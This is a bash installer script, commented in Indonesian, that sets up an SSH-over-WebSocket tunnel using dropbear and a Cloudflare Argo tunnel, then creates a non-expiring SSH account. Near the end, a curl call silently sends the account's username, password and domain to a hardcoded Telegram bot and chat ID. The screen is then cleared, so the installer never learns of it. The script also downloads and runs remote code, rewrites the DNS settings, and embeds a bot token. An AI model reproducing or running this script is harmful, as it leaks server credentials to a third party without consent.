#!/bin/bash

# [ Memeriksa DNS ]
if [[ -z $(cat /etc/resolv.conf | grep "1.1.1.1") ]]; then cat <(echo "nameserver 1.1.1.1") /etc/resolv.conf > /etc/resolv.conf.tmp && mv /etc/resolv.conf.tmp /etc/resolv.conf; fi

# [ Membersihkan Layar ]
clear
# [ Installing Package ]
apt update -y
apt upgrade -y
apt install python3 -y
apt install dropbear -y

# [ Membersihkan Layar ]
clear

# [ Menginstall Core WebSocket ]
cd /usr/bin
wget -O ws "https://raw.githubusercontent.com/DindaPutriFN/WebSocket-Proxy/main/ws.py"
chmod +x ws
clear
cd
touch /root/.ws
nohup python3 /usr/bin/ws > /root/.ws/ws.log 2>&1 &
wget -O /etc/default/dropbear "https://raw.githubusercontent.com/DindaPutriFN/FN-API/main/config/dropbear"
service dropbear enable
service dropbear start
service dropbear restart
clear

# [ Menginstall Core Argo Tunnel ]
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
rm -fr cloudflared-linux-amd64.deb

# [ Membuat Dkrectory Argo Tunnel ]
rm -fr /etc/cloudflared
mkdir -p /etc/cloudflared

cd

clear
echo -e "Login to your cloudflare Account"
cloudflared tunnel login

clear
random=$(openssl rand -base64 15 | tr -dc 'a-z' | head -c 8)
echo " Create Node For Server Data "
echo "$random" > /root/.rcs
rcs=$(cat /root/.rcs)
cloudflared tunnel create $rcs
clear
id=$(basename ~/.cloudflared/*.json | sed 's/\.json$//')
echo -e "Save Your ID"
echo -e "ID: $id"
sleep 10
clear
echo -e "
Setup Your Domain Argo Tunnel
=============================

Example: mysubdom.myvpn.com

replace mysubdomain with your desired subdomain and replace myvpn.com with the domain you chose in cloudflare for argo tunnel after login
=============================
"
#read -p "Input Xray Domain: " opws
read -p "Input SSH Domain: " sws
#cloudflared tunnel route dns $rcs $opws
cloudflared tunnel route dns $rcs $sws
#echo "$opws" > /etc/xray/domargo
#echo "$sws" > /etc/xray/domssh
#domargo="$opws"
domssh="$sws"
clear
# Membuar Konfigurasi
echo "tunnel: $rcs
credentials-file: /root/.cloudflared/$id.json

ingress:
  - hostname: $domssh
    service: http://localhost:700
    headers:
      Upgrade: websocket
      Connection: Upgrade
  - service: http_status:404" > /etc/cloudflared/config.yml
# Menyimpan Domain
#echo "$domargo" > /etc/xray/domargo
echo -e "$domssh" > /root/.domain

# Menjalankan Servixe
sudo cloudflared service install

# [ Service Dropbear ]
service cloudflared enable
service cloudflared start
service cloudflared restart

# Clearing Terminal
clear
domain=$(cat /root/.domain)
clear
echo -e "\e[33m═══════════════════════════════════\033[0m"
echo -e "\E[40;1;37m            SSH Account            \E[0m"
echo -e "\e[33m═══════════════════════════════════\033[0m"
read -p "Username       : " Login
read -p "Password       : " Pass
# Set expired to never
masaaktif="never"
clear
useradd -e never -s /bin/false -M $Login
echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
echo "$Login:$Pass" | sudo chpasswd
clear
TEKS="
═══════════════════════════
<=      SSH ACCOUNT      =>
═══════════════════════════

Username     : $Login
Password     : $Pass
Host/IP      : $domain
Port ssl/tls : 443, 8443, 2053, 2083, 2087, 2096
Port non tls : 80, 8080, 8880, 2052, 2082, 2086, 2095
BadVpn       : 7300
═══════════════════════════
Payload Ws   => GET / HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf]
═══════════════════════════
Expired => $masaaktif
═══════════════════════════
"
clear
CHATID="6389176425"
KEY="6981433170:AAFhh3UQi2H_lsJiAjGEMoj4xad2TdNHQfI"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
curl -s --max-time $TIME --data-urlencode "chat_id=$CHATID" --data-urlencode "text=$TEKS" $URL
clear
echo -e "$TEKS"
